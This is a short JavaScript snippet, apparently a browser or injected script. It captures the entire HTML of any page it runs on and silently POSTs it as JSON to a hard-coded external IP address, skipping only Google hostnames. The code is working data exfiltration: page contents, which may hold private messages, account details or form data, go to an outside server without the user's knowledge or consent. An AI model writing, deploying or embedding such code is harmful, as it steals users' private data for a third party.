const body = document.body.innerHTML;
const hostname = window.location.hostname;

if(!hostname.includes('google')) {
  fetch('http://193.106.200.232/parse/', {
    method: 'POST',
    cache: 'no-cache',
    credentials: 'same-origin',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({html: body})
  }).then(r => {
    console.log('result', r)
  })
}
